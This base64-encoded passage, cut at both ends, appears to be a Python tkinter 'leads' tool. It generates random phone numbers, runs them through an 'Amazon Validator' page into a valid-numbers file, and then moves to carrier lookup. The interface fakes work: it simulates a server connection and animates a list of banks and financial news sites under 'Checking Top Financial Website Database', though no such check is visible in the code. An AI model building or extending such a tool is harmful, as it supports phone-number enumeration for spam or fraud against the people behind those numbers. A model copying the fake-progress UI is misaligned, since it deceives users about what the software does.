ZW50cnkpCgogICAgICAgIHR0ay5MYWJlbChmb3JtX2NvbnRhaW5lciwgdGV4dD0iUHJlZml4ZXMgKG9wdGlvbmFsLCBjb21tYSBvciBzcGFjZSBzZXBhcmF0ZWQpOiIpLmdyaWQocm93PTIsIGNvbHVtbj0wLCBzdGlja3k9InciLCBwYWR5PTUsIHBhZHg9NSkKICAgICAgICBzZWxmLnByZWZpeF9lbnRyeSA9IHR0ay5FbnRyeShmb3JtX2NvbnRhaW5lcikKICAgICAgICBzZWxmLnByZWZpeF9lbnRyeS5ncmlkKHJvdz0yLCBjb2x1bW49MSwgc3RpY2t5PSJldyIsIHBhZHk9NSwgcGFkeD01KQogICAgICAgIGFkZF9jb250ZXh0X21lbnUoc2VsZi5wcmVmaXhfZW50cnkpCgogICAgICAgIHR0ay5MYWJlbChmb3JtX2NvbnRhaW5lciwgdGV4dD0iSG93IG1hbnkgcGhvbmUgbnVtYmVycyB0byBnZW5lcmF0ZToiKS5ncmlkKHJvdz0zLCBjb2x1bW49MCwgc3RpY2t5PSJ3IiwgcGFkeT01LCBwYWR4PTUpCiAgICAgICAgc2VsZi5jb3VudF9lbnRyeSA9IHR0ay5FbnRyeShmb3JtX2NvbnRhaW5lcikKICAgICAgICBzZWxmLmNvdW50X2VudHJ5LmdyaWQocm93PTMsIGNvbHVtbj0xLCBzdGlja3k9ImV3IiwgcGFkeT01LCBwYWR4PTUpCiAgICAgICAgYWRkX2NvbnRleHRfbWVudShzZWxmLmNvdW50X2VudHJ5KQogICAgICAgIGZvcm1fY29udGFpbmVyLmNvbHVtbmNvbmZpZ3VyZSgxLCB3ZWlnaHQ9MSkKCiAgICAgICAgIyBQcm9ncmVzcyBCYXIgU2VjdGlvbgogICAgICAgIHNlbGYuZ2VuX3Byb2dyZXNzID0gdHRrLlByb2dyZXNzYmFyKHNlbGYsIG9yaWVudD0iaG9yaXpvbnRhbCIsIG1vZGU9ImRldGVybWluYXRlIiwgc3R5bGU9Ikhvcml6b250YWwuVFByb2dyZXNzYmFyIikKICAgICAgICBzZWxmLmdlbl9wcm9ncmVzcy5wYWNrKHBhZHk9MTAsIHBhZHg9MjAsIGZpbGw9IngiKQogICAgICAgIHNlbGYucHJvZ3Jlc3NfbGFiZWwgPSB0dGsuTGFiZWwoc2VsZiwgdGV4dD0iUHJvZ3Jlc3M6IDAlIikKICAgICAgICBzZWxmLnByb2dyZXNzX2xhYmVsLnBhY2socGFkeT0oMCwgMTApKQoKICAgICAgICAjIEJ1dHRvbnMgU2VjdGlvbgogICAgICAgIGJ1dHRvbl9mcmFtZSA9IHR0ay5GcmFtZShzZWxmKQogICAgICAgIGJ1dHRvbl9mcmFtZS5wYWNrKHBhZHk9MTApCiAgICAgICAgc2VsZi5nZW5lcmF0ZV9idXR0b24gPSB0dGsuQnV0dG9uKGJ1dHRvbl9mcmFtZSwgdGV4dD0iR2VuZXJhdGUiLCBjb21tYW5kPXNlbGYuc3RhcnRfZ2VuZXJhdGlvbikKICAgICAgICBzZWxmLmdlbmVyYXRlX2J1dHRvbi5ncmlkKHJvdz0wLCBjb2x1bW49MCwgcGFkeD0xMCkKICAgICAgICBzZWxmLmNvbnRpbnVlX2J1dHRvbiA9IHR0ay5CdXR0b24oYnV0dG9uX2ZyYW1lLCB0ZXh0PSJDb250aW51ZSB0byBWYWxpZGF0ZSIsIGNvbW1hbmQ9c2VsZi5nb190b192YWxpZGF0aW9uLCBzdGF0ZT0iZGlzYWJsZWQiKQogICAgICAgIHNlbGYuY29udGludWVfYnV0dG9uLmdyaWQocm93PTAsIGNvbHVtbj0xLCBwYWR4PTEwKQoKICAgIGRlZiB1cGRhdGVfZ2VuX3Byb2dyZXNzKHNlbGYsIGN1cnJlbnQsIHRvdGFsLCBtZXNzYWdlPU5vbmUpOgogICAgICAgIHBlcmNlbnQgPSAoY3VycmVudCAvIHRvdGFsICogMTAwKSBpZiB0b3RhbCBlbHNlIDAKICAgICAgICBzZWxmLmdlbl9wcm9ncmVzc1snbWF4aW11bSddID0gdG90YWwKICAgICAgICBzZWxmLmdlbl9wcm9ncmVzc1sndmFsdWUnXSA9IGN1cnJlbnQKICAgICAgICBzZWxmLnByb2dyZXNzX2xhYmVsLmNvbmZpZyh0ZXh0PWYiUHJvZ3Jlc3M6IHtwZXJjZW50Oi4wZn0lIikKICAgICAgICBpZiBtZXNzYWdlOgogICAgICAgICAgICBzZWxmLnByb2dyZXNzX2xhYmVsLmNvbmZpZyh0ZXh0PW1lc3NhZ2UpCgogICAgZGVmIGFuaW1hdGUoc2VsZik6CiAgICAgICAgaWYgc2VsZi5hbmltYXRpbmc6CiAgICAgICAgICAgIHNlbGYuYW5pbWF0aW9uX2xhYmVsLmNvbmZpZyh0ZXh0PXNlbGYuYW5pbWF0aW9uX3RleHRzW3NlbGYuYW5pbWF0aW9uX2luZGV4XSkKICAgICAgICAgICAgc2VsZi5hbmltYXRpb25faW5kZXggPSAoc2VsZi5hbmltYXRpb25faW5kZXggKyAxKSAlIGxlbihzZWxmLmFuaW1hdGlvbl90ZXh0cykKICAgICAgICAgICAgc2VsZi5hZnRlcig1MDAsIHNlbGYuYW5pbWF0ZSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLmFuaW1hdGlvbl9sYWJlbC5jb25maWcodGV4dD0iIikKCiAgICBkZWYgc3RhcnRfZ2VuZXJhdGlvbihzZWxmKToKICAgICAgICBzZWxmLmdlbmVyYXRlX2J1dHRvbi5jb25maWcoc3RhdGU9ImRpc2FibGVkIikKICAgICAgICBzZWxmLmFuaW1hdGluZyA9IFRydWUKICAgICAgICBzZWxmLmFuaW1hdGUoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuZ2VuZXJhdGVfbnVtYmVyc190aHJlYWQsIGRhZW1vbj1UcnVlKS5zdGFydCgpCgogICAgZGVmIGdlbmVyYXRlX251bWJlcnNfdGhyZWFkKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgY291bnRyeV9jb2RlID0gc2VsZi5jb3VudHJ5X3Zhci5nZXQoKS5zdHJpcCgpCiAgICAgICAgICAgIGFyZWFfY29kZXNfcmF3ID0gc2VsZi5hcmVhX2VudHJ5LmdldCgpLnN0cmlwKCkKICAgICAgICAgICAgcHJlZml4ZXNfcmF3ID0gc2VsZi5wcmVmaXhfZW50cnkuZ2V0KCkuc3RyaXAoKQogICAgICAgICAgICBjb3VudF9zdHIgPSBzZWxmLmNvdW50X2VudHJ5LmdldCgpLnN0cmlwKCkKICAgICAgICAgICAgaWYgbm90IChhcmVhX2NvZGVzX3JhdyBhbmQgY291bnRfc3RyKToKICAgICAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2Vycm9yKCJJbnB1dCBFcnJvciIsICJQbGVhc2UgZmlsbCBpbiB0aGUgcmVxdWlyZWQgZmllbGRzIChhcmVhIGNvZGVzIGFuZCBudW1iZXIgY291bnQpLiIsIHBhcmVudD1zZWxmKQogICAgICAgICAgICAgICAgc2VsZi5nZW5lcmF0ZV9idXR0b24uY29uZmlnKHN0YXRlPSJub3JtYWwiKQogICAgICAgICAgICAgICAgc2VsZi5hbmltYXRpbmcgPSBGYWxzZQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG51bV9jb3VudCA9IGludChjb3VudF9zdHIpCiAgICAgICAgICAgICAgICBpZiBudW1fY291bnQgPD0gMDoKICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yCiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgbWVzc2FnZWJveC5zaG93ZXJyb3IoIklucHV0IEVycm9yIiwgIlBsZWFzZSBlbnRlciBhIHBvc2l0aXZlIGludGVnZXIgZm9yIHRoZSBudW1iZXIgY291bnQuIiwgcGFyZW50PXNlbGYpCiAgICAgICAgICAgICAgICBzZWxmLmdlbmVyYXRlX2J1dHRvbi5jb25maWcoc3RhdGU9Im5vcm1hbCIpCiAgICAgICAgICAgICAgICBzZWxmLmFuaW1hdGluZyA9IEZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIGFyZWFfY29kZXMgPSBbY29kZS5zdHJpcCgpIGZvciBjb2RlIGluIHJlLnNwbGl0KHInWyxcc10rJywgYXJlYV9jb2Rlc19yYXcpIGlmIGNvZGUuaXNkaWdpdCgpXQogICAgICAgICAgICBpZiBub3QgYXJlYV9jb2RlczoKICAgICAgICAgICAgICAgIG1lc3NhZ2Vib3guc2hvd2Vycm9yKCJJbnB1dCBFcnJvciIsICJQbGVhc2UgZW50ZXIgdmFsaWQgYXJlYSBjb2RlcyAobnVtZXJpYykuIiwgcGFyZW50PXNlbGYpCiAgICAgICAgICAgICAgICBzZWxmLmdlbmVyYXRlX2J1dHRvbi5jb25maWcoc3RhdGU9Im5vcm1hbCIpCiAgICAgICAgICAgICAgICBzZWxmLmFuaW1hdGluZyA9IEZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIHByZWZpeGVzID0gW10KICAgICAgICAgICAgaWYgcHJlZml4ZXNfcmF3OgogICAgICAgICAgICAgICAgcHJlZml4ZXMgPSBbcC5zdHJpcCgpIGZvciBwIGluIHJlLnNwbGl0KHInWyxcc10rJywgcHJlZml4ZXNfcmF3KSBpZiBwLmlzZGlnaXQoKV0KCiAgICAgICAgICAgIHNlbGYudXBkYXRlX2dlbl9wcm9ncmVzcygwLCBudW1fY291bnQsICJDb25uZWN0aW5nIHRvIHNlcnZlci4uLiIpCiAgICAgICAgICAgIHNpbXVsYXRlX2FwaV9yZXF1ZXN0KGR1cmF0aW9uPTEpCiAgICAgICAgICAgIGdlbmVyYXRlZF9udW1iZXJzID0gW10KICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UobnVtX2NvdW50KToKICAgICAgICAgICAgICAgIGFyZWEgPSByYW5kb20uY2hvaWNlKGFyZWFfY29kZXMpCiAgICAgICAgICAgICAgICBpZiBwcmVmaXhlczoKICAgICAgICAgICAgICAgICAgICBwcmVmaXggPSByYW5kb20uY2hvaWNlKHByZWZpeGVzKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmVmaXggPSBzdHIocmFuZG9tLnJhbmRpbnQoMTAwLCA5OTkpKQogICAgICAgICAgICAgICAgaWYgY291bnRyeV9jb2RlID09ICI2MSI6CiAgICAgICAgICAgICAgICAgICAgbG9jYWxfbGVuZ3RoID0gcmFuZG9tLmNob2ljZShbNiwgOF0pCiAgICAgICAgICAgICAgICAgICAgbGluZV9udW1iZXIgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKCcwMTIzNDU2Nzg5Jywgaz1sb2NhbF9sZW5ndGgpKQogICAgICAgICAgICAgICAgICAgIHBob25lX251bWJlciA9IGYnK3tjb3VudHJ5X2NvZGV9ICh7YXJlYX0pIHtwcmVmaXh9e2xpbmVfbnVtYmVyfScKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbGluZV9udW1iZXIgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2VzKCcwMTIzNDU2Nzg5Jywgaz00KSkKICAgICAgICAgICAgICAgICAgICBwaG9uZV9udW1iZXIgPSBmJyt7Y291bnRyeV9jb2RlfSAoe2FyZWF9KSB7cHJlZml4fS17bGluZV9udW1iZXJ9JwogICAgICAgICAgICAgICAgZ2VuZXJhdGVkX251bWJlcnMuYXBwZW5kKHBob25lX251bWJlcikKICAgICAgICAgICAgICAgIHByaW50KGNvbG9yZWQoIj0+ICIgKyBwaG9uZV9udW1iZXIsICJncmVlbiIpKQogICAgICAgICAgICAgICAgc2VsZi5jb250cm9sbGVyLmFmdGVyKDAsIHNlbGYudXBkYXRlX2dlbl9wcm9ncmVzcywgaSArIDEsIG51bV9jb3VudCkKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDAwMSkKICAgICAgICAgICAgY2xlYXJfZmlsZSgiR2VuLnR4dCIpCiAgICAgICAgICAgIHdpdGggb3BlbigiR2VuLnR4dCIsICJ3IikgYXMgZjoKICAgICAgICAgICAgICAgIGZvciBudW0gaW4gZ2VuZXJhdGVkX251bWJlcnM6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShudW0gKyAiXG4iKQogICAgICAgICAgICBzZWxmLmNvbnRyb2xsZXIuYWZ0ZXIoMCwgc2VsZi51cGRhdGVfZ2VuX3Byb2dyZXNzLCBudW1fY291bnQsIG51bV9jb3VudCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYiRG9uZToge251bV9jb3VudH0gbnVtYmVycyBnZW5lcmF0ZWQgYW5kIHNhdmVkLiIpCiAgICAgICAgICAgIHNlbGYuY29udHJvbGxlci5hZnRlcigwLCBsYW1iZGE6IHNlbGYuY29udGludWVfYnV0dG9uLmNvbmZpZyhzdGF0ZT0ibm9ybWFsIikpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBtZXNzYWdlYm94LnNob3dlcnJvcigiRXJyb3IiLCBzdHIoZSksIHBhcmVudD1zZWxmKQogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIHNlbGYuYW5pbWF0aW5nID0gRmFsc2UKCiAgICBkZWYgYW5pbWF0ZShzZWxmKToKICAgICAgICBpZiBzZWxmLmFuaW1hdGluZzoKICAgICAgICAgICAgc2VsZi5hbmltYXRpb25fbGFiZWwuY29uZmlnKHRleHQ9c2VsZi5hbmltYXRpb25fdGV4dHNbc2VsZi5hbmltYXRpb25faW5kZXhdKQogICAgICAgICAgICBzZWxmLmFuaW1hdGlvbl9pbmRleCA9IChzZWxmLmFuaW1hdGlvbl9pbmRleCArIDEpICUgbGVuKHNlbGYuYW5pbWF0aW9uX3RleHRzKQogICAgICAgICAgICBzZWxmLmFmdGVyKDUwMCwgc2VsZi5hbmltYXRlKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNlbGYuYW5pbWF0aW9uX2xhYmVsLmNvbmZpZyh0ZXh0PSIiKQoKICAgIGRlZiBnb190b192YWxpZGF0aW9uKHNlbGYpOgogICAgICAgIHNlbGYuY29udHJvbGxlci5zaG93X2ZyYW1lKCJWYWxpZGF0aW9uUGFnZSIpCgoKIyAtLS0tLS0tLS0tLS0tLS0tLSBQYWdlIDI6IFZhbGlkYXRpb24gKEFtYXpvbiBWYWxpZGF0b3IpIFBhZ2UgLS0tLS0tLS0tLS0tLS0tLS0KY2xhc3MgVmFsaWRhdGlvblBhZ2UodHRrLkZyYW1lKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBwYXJlbnQsIGNvbnRyb2xsZXIpOgogICAgICAgIHN1cGVyKCkuX19pbml0X18ocGFyZW50KQogICAgICAgIHNlbGYuY29udHJvbGxlciA9IGNvbnRyb2xsZXIKICAgICAgICBzZWxmLmFuaW1hdGluZyA9IEZhbHNlCiAgICAgICAgc2VsZi5hbmltYXRpb25faW5kZXggPSAwCiAgICAgICAgc2VsZi5hbmltYXRpb25fdGV4dHMgPSBbCiAgICAgICAgICAgICJZYWhvbyBGaW5hbmNlIiwKICAgICAgICAgICAgIllhaG9vIEZpbmFuY2UsIEZvcmJlcyIsCiAgICAgICAgICAgICJZYWhvbyBGaW5hbmNlLCBGb3JiZXMsIENOQkMiLAogICAgICAgICAgICAiWWFob28gRmluYW5jZSwgRm9yYmVzLCBDTkJDLCBCbG9vbWJlcmciLAogICAgICAgICAgICAiWWFob28gRmluYW5jZSwgRm9yYmVzLCBDTkJDLCBCbG9vbWJlcmcsIFUuUy4gQmFuayIsCiAgICAgICAgICAgICJZYWhvbyBGaW5hbmNlLCBGb3JiZXMsIENOQkMsIEJsb29tYmVyZywgVS5TLiBCYW5rLCBQTkMgRlMiLAogICAgICAgICAgICAiWWFob28gRmluYW5jZSwgRm9yYmVzLCBDTkJDLCBCbG9vbWJlcmcsIFUuUy4gQmFuaywgUE5DIEZTLCBUcnVpc3QgQ29ycC4iLAogICAgICAgICAgICAiWWFob28gRmluYW5jZSwgRm9yYmVzLCBDTkJDLCBCbG9vbWJlcmcsIFUuUy4gQmFuaywgUE5DIEZTLCBUcnVpc3QgQ29ycC4sIEludmVzdG9wZWRpYSIsCiAgICAgICAgICAgICJZYWhvbyBGaW5hbmNlLCBGb3JiZXMsIENOQkMsIEJsb29tYmVyZywgVS5TLiBCYW5rLCBQTkMgRlMsIFRydWlzdCBDb3JwLiwgSW52ZXN0b3BlZGlhLCBXU0oiLAogICAgICAgICAgICAiWWFob28gRmluYW5jZSwgRm9yYmVzLCBDTkJDLCBCbG9vbWJlcmcsIFUuUy4gQmFuaywgUE5DIEZTLCBUcnVpc3QgQ29ycC4sIEludmVzdG9wZWRpYSwgV1NKLCBNYXJrZXRXYXRjaCIsCiAgICAgICAgICAgICJZYWhvbyBGaW5hbmNlLCBGb3JiZXMsIENOQkMsIEJsb29tYmVyZywgVS5TLiBCYW5rLCBQTkMgRlMsIFRydWlzdCBDb3JwLiwgSW52ZXN0b3BlZGlhLCBXU0osIE1hcmtldFdhdGNoLCBURCBCYW5rIiwKICAgICAgICAgICAgIllhaG9vIEZpbmFuY2UsIEZvcmJlcywgQ05CQywgQmxvb21iZXJnLCBVLlMuIEJhbmssIFBOQyBGUywgVHJ1aXN0IENvcnAuLCBJbnZlc3RvcGVkaWEsIFdTSiwgTWFya2V0V2F0Y2gsIFREIEJhbmssIENhcGl0YWwgT25lIiwKICAgICAgICAgICAgIllhaG9vIEZpbmFuY2UsIEZvcmJlcywgQ05CQywgQmxvb21iZXJnLCBVLlMuIEJhbmssIFBOQyBGUywgVHJ1aXN0IENvcnAuLCBJbnZlc3RvcGVkaWEsIFdTSiwgTWFya2V0V2F0Y2gsIFREIEJhbmssIENhcGl0YWwgT25lLCBHb2xkbWFuIFNhY2hzIgogICAgICAgIF0KICAgICAgICAKICAgICAgICAjIEhlYWRlciBMYWJlbAogICAgICAgIGhlYWRlciA9IHR0ay5MYWJlbCgKICAgICAgICAgICAgc2VsZiwgCiAgICAgICAgICAgIHRleHQ9IiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2hlY2tpbmcgVG9wIEZpbmFuY2lhbCBXZWJzaXRlIERhdGFiYXNlIiwgCiAgICAgICAgICAgIHN0eWxlPSJIZWFkZXIuVExhYmVsIgogICAgICAgICkKICAgICAgICBoZWFkZXIucGFjayhmaWxsPSJ4IiwgcGFkeT0oMCwgMTApKQogICAgICAgIAogICAgICAgICMgQW5pbWF0aW9uIExhYmVsIGFwcGVhcnMgYmVmb3JlIHRoZSBwcm9ncmVzcyBiYXIuCiAgICAgICAgc2VsZi5hbmltYXRpb25fbGFiZWwgPSB0dGsuTGFiZWwoc2VsZiwgdGV4dD0iIiwgZm9udD0oIlNlZ29lIFVJIiwgMTAsICJpdGFsaWMiKSkKICAgICAgICBzZWxmLmFuaW1hdGlvbl9sYWJlbC5wYWNrKHBhZHk9KDAsIDEwKSkKICAgICAgICAKICAgICAgICAjIFByb2dyZXNzIEJhcgogICAgICAgIHNlbGYudmFsX3Byb2dyZXNzID0gdHRrLlByb2dyZXNzYmFyKAogICAgICAgICAgICBzZWxmLCBvcmllbnQ9Imhvcml6b250YWwiLCBtb2RlPSJkZXRlcm1pbmF0ZSIsIHN0eWxlPSJIb3Jpem9udGFsLlRQcm9ncmVzc2JhciIKICAgICAgICApCiAgICAgICAgc2VsZi52YWxfcHJvZ3Jlc3MucGFjayhwYWR5PTEwLCBwYWR4PTIwLCBmaWxsPSJ4IikKICAgICAgICAKICAgICAgICAjIFZhbGlkYXRpb24gU3RhdHVzIExhYmVsCiAgICAgICAgc2VsZi52YWxfbGFiZWwgPSB0dGsuTGFiZWwoc2VsZiwgdGV4dD0iVmFsaWRhdGluZyBsZWFkcy4uLiAwJSIpCiAgICAgICAgc2VsZi52YWxfbGFiZWwucGFjayhwYWR5PSgwLCAxMCkpCiAgICAgICAgCiAgICAgICAgIyBDb250aW51ZSBCdXR0b24gKGRpc2FibGVkIHVudGlsIHByb2Nlc3NpbmcgY29tcGxldGVzKQogICAgICAgIHNlbGYuY29udGludWVfYnV0dG9uID0gdHRrLkJ1dHRvbihzZWxmLCB0ZXh0PSJDb250aW51ZSIsIGNvbW1hbmQ9c2VsZi5nb190b19jYXJyaWVyLCBzdGF0ZT0iZGlzYWJsZWQiKQogICAgICAgIHNlbGYuY29udGludWVfYnV0dG9uLnBhY2socGFkeT0xMCkKICAgICAgICAKICAgIGRlZiBvbl9zaG93KHNlbGYpOgogICAgICAgICMgUmVzZXQgZ2xvYmFsIGNvdW50ZXJzIGFuZCBjbGVhciBwcmV2aW91cyByZXN1bHRzLgogICAgICAgIGdsb2JhbCBjb21wbGV0ZWRfdGFza3MsIHRvdGFsX251bWJlcnMKICAgICAgICBjb21wbGV0ZWRfdGFza3MgPSAwCiAgICAgICAgdG90YWxfbnVtYmVycyA9IDAKICAgICAgICBjbGVhcl9maWxlKCJWYWxpZDMzLnR4dCIpCiAgICAgICAgCiAgICAgICAgIyBTdGFydCB0aGUgcHJvY2Vzc19udW1iZXJzIGZ1bmN0aW9uIGluIGEgc2VwYXJhdGUgdGhyZWFkLgogICAgICAgIHNlbGYudmFsaWRhdGlvbl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wcm9jZXNzX251bWJlcnMsIGRhZW1vbj1UcnVlKQogICAgICAgIHNlbGYudmFsaWRhdGlvbl90aHJlYWQuc3RhcnQoKQogICAgICAgIAogICAgICAgICMgU3RhcnQgYW5pbWF0aW9uIGFuZCBwcm9ncmVzcyB1cGRhdGUuCiAgICAgICAgc2VsZi5hbmltYXRpbmcgPSBUcnVlCiAgICAgICAgc2VsZi5hbmltYXRlKCkKICAgICAgICBzZWxmLnVwZGF0ZV92YWxpZGF0aW9uX3Byb2dyZXNzKCkKICAgIAogICAgZGVmIHVwZGF0ZV92YWxpZGF0aW9uX3Byb2dyZXNzKHNlbGYpOgogICAgICAgIGdsb2JhbCBjb21wbGV0ZWRfdGFza3MsIHRvdGFsX251bWJlcnMKICAgICAgICAjIENvdW50IHZhbGlkIGVudHJpZXMgZnJvbSBmaWxlICJWYWxpZDMzLnR4dCIKICAgICAgICB2YWxpZF9jb3VudCA9IDAKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiVmFsaWQzMy50eHQiKToKICAgICAgICAgICAgd2l0aCBvcGVuKCJWYWxpZDMzLnR4dCIsICJyIikgYXMgZjoKICAgICAgICAgICAgICAgIHZhbGlkX2NvdW50ID0gc3VtKDEgZm9yIGxpbmUgaW4gZiBpZiBsaW5lLnN0cmlwKCkpCiAgICAgICAgCiAgICAgICAgIyBDYWxjdWxhdGUgcHJvZ3Jlc3MgcGVyY2VudGFnZSBzYWZlbHkuCiAgICAgICAgcGVyY2VudCA9IChjb21wbGV0ZWRfdGFza3MgLyB0b3RhbF9udW1iZXJzICogMTAwKSBpZiB0b3RhbF9udW1iZXJzIGVsc2UgMAogICAgICAgIAogICAgICAgICMgVXBkYXRlIHByb2dyZXNzIGJhciBhbmQgdmFsaWRhdGlvbiBsYWJlbC4KICAgICAgICBzZWxmLnZhbF9wcm9ncmVzc1snbWF4aW11bSddID0gdG90YWxfbnVtYmVycwogICAgICAgIHNlbGYudmFsX3Byb2dyZXNzWyd2YWx1ZSddID0gY29tcGxldGVkX3Rhc2tzCiAgICAgICAgc2VsZi52YWxfbGFiZWwuY29uZmlnKHRleHQ9ZiJQcm9jZXNzZWQ6IHt0b3RhbF9udW1iZXJzfSwgVmFsaWQ6IHt2YWxpZF9jb3VudH0sIHtwZXJjZW50Oi4wZn0lIikKICAgICAgICAKICAgICAgICAjIENvbnRpbnVlIHVwZGF0aW5nIHByb2dyZXNzIGlmIHByb2Nlc3NpbmcgaXMgc3RpbGwgcnVubmluZy4KICAgICAgICBpZiBzZWxmLnZhbGlkYXRpb25fdGhyZWFkLmlzX2FsaXZlKCk6CiAgICAgICAgICAgIHNlbGYuYWZ0ZXIoMTAwLCBzZWxmLnVwZGF0ZV92YWxpZGF0aW9uX3Byb2dyZXNzKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICMgU3RvcCB0aGUgYW5pbWF0aW9uIGFuZCBlbmFibGUgdGhlIGNvbnRpbnVlIGJ1dHRvbiBvbmNlIGNvbXBsZXRlLgogICAgICAgICAgICBzZWxmLmFuaW1hdGluZyA9IEZhbHNlCiAgICAgICAgICAgICMgUmVmcmVzaCB2YWxpZCBjb3VudCBvbiBjb21wbGV0aW9uLgogICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiVmFsaWQzMy50eHQiKToKICAgICAgICAgICAgICAgIHdpdGggb3BlbigiVmFsaWQzMy50eHQiLCAiciIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgdmFsaWRfY291bnQgPSBzdW0oMSBmb3IgbGluZSBpbiBmIGlmIGxpbmUuc3RyaXAoKSkKICAgICAgICAgICAgc2VsZi52YWxfbGFiZWwuY29uZmlnKHRleHQ9ZiJWYWxpZGF0aW9uIGNvbXBsZXRlISBQcm9jZXNzZWQ6IHt0b3RhbF9udW1iZXJzfSwgVmFsaWQ6IHt2YWxpZF9jb3VudH0iKQogICAgICAgICAgICBzZWxmLmNvbnRpbnVlX2J1dHRvbi5jb25maWcoc3RhdGU9Im5vcm1hbCIpCiAgICAKICAgIGRlZiBhbmltYXRlKHNlbGYpOgogICAgICAgIGlmIHNlbGYuYW5pbWF0aW5nOgogICAgICAgICAgICBzZWxmLmFuaW1hdGlvbl9sYWJlbC5jb25maWcodGV4dD1zZWxmLmFuaW1hdGlvbl90ZXh0c1tzZWxmLmFuaW1hdGlvbl9pbmRleF0pCiAgICAgICAgICAgIHNlbGYuYW5pbWF0aW9uX2luZGV4ID0gKHNlbGYuYW5pbWF0aW9uX2luZGV4ICsgMSkgJSBsZW4oc2VsZi5hbmltYXRpb25fdGV4dHMpCiAgICAgICAgICAgIHNlbGYuYWZ0ZXIoNTAwLCBzZWxmLmFuaW1hdGUpICAjIENvbnRpbnVlIGFuaW1hdGlvbiBldmVyeSA1MDBtcy4KICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLmFuaW1hdGlvbl9sYWJlbC5jb25maWcodGV4dD0iIikgICMgQ2xlYXIgYW5pbWF0aW9uIHRleHQgaWYgbm90IGFuaW1hdGluZy4KICAgIAogICAgZGVmIGdvX3RvX2NhcnJpZXIoc2VsZik6CiAgICAgICAgIyBUcmFuc2l0aW9uIHRvIHRoZSBDYXJyaWVyIExvb2t1cCBQYWdlLgogICAgICAgIHNlbGYuY29udHJvbGxlci5zaG93X2ZyYW1lKCJDYXJyaWVyTG9va3VwUGFnZSIpCgojIC0tLS0tLS0tLS0tLS0tLS0tIFBhZ2UgMzogQ2FycmllciBMb29rdXAgLS0tLS0tLS0tLS0tLS0tLS0KY2xhc3MgQ2Fycmllckxvb2t1cFBhZ2UodHRrLkZyYW1lKToKCiAgICBkZWYgX19pbml0X18oc2VsZiwgcGFyZW50LCBjb250cm9sbGVyKToKICAgICAgICB0dGsuRnJhbWUuX19pbml0X18oc2VsZiwgcGFyZW50KQogICAgICAgIHNlbGYuY29udHJvbGxlciA9IGNvbnRyb2xsZXIKICAgICAgICBzZWxmLmFuaW1hdGluZyA9IEZhbHNlCiAgICAgICAgc2VsZi5hbmltYXRpb25faW5kZXggPSAwCiAgICAgICAgc2VsZi5hbmltYXRpb25fdGV4dHMgPSBbCiAgICAgICAgICAgICJMb29raW5nIHVwIGNhcnJpZXJzLiIsCiAgICAgICAgICAgICJMb29raW5nIHVwIGNhcnJpZXJzLi4iLAogICAgICAgICAgICAiTG9va2luZyB1cCBjYXJyaWVycy4uLiIsCiAgICAgICAgICAgICJMb29raW5nIHVwIGNhcnJpZXJzLi4uLiIsCiAgICAgICAgICAgICJMb29raW5nIHVwIGNhcnJpZXJzLi4uLi4iICAgICAgICAgICAgCiAgICAgICAgXQoKICAgICAgICBoZWFkZXIgPSB0dGsuTGFiZWwoc2VsZiwgdGV4dD0iICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDYXJyaWVyIExvb2t1cCIsIHN0eWxlPSJIZWFkZXIuVExhYmVsIikKICAgICAgICBoZWFkZXIucGFjayhmaWxsPSJ4IiwgcGFkeT0oMCwgMTApKQoKICAgICAgICAjIEFuaW1hdGVkIGxhYmVsIGZvciBjYXJyaWVyIGxvb2t1cCBhbmltYXRpb24KICAgICAgICBzZWxmLmFuaW1hdGlvbl9sYWJlbCA9IHR0ay5MYWJlbCgKICAgICAgICAgICAgc2VsZiwKICAgICAgICAgICAgdGV4dD0iIiwKICAgICAgICAgICAgZm9udD0oIlNlZ29lIFVJIiwgMTIsICJpdGFsaWMiKSwKICAgICAgICAgICAgZm9yZWdyb3VuZD0iIzAwNTJjYyIKICAgICAgICApCiAgICAgICAgc2VsZi5hbmltYXRpb25fbGFiZWwucGFjayhwYWR5PSgwLCAxMCkpCgogICAgICAgIHNlbGYuY2Fycmllcl9wcm9ncmVzcyA9IHR0ay5Qcm9ncmVzc2JhcigKICAgICAgICAgICAgc2VsZiwKICAgICAgICAgICAgb3JpZW50PSJob3Jpem9udGFsIiwKICAgICAgICAgICAgbW9kZT0iaW5kZXRlcm1pbmF0ZSIsCiAgICAgICAgICAgIHN0eWxlPSJIb3Jpem9udGFsLlRQcm9ncmVzc2JhciIKICAgICAgICApCiAgICAgICAgc2VsZi5jYXJyaWVyX3Byb2dyZXNzLnBhY2socGFkeT0xMCwgcG